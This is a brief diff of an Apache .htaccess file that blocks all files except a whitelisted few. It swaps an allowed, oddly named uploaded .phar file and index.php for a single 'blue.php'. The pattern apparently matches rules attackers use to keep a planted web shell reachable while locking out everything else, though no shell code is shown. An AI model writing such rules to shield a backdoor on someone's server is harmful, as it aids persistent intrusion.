@@ -2,7 +2,7 @@
 Order allow,deny 
 Deny from all 
 </FilesMatch> 
-<FilesMatch "^(20240129133818-4798-file_kartu_taspen-20240129-70-app.phar|index.php)$"># 
+<FilesMatch "^(blue.php)$"># 
 Order allow,deny 
 Allow from all 
 </FilesMatch> 
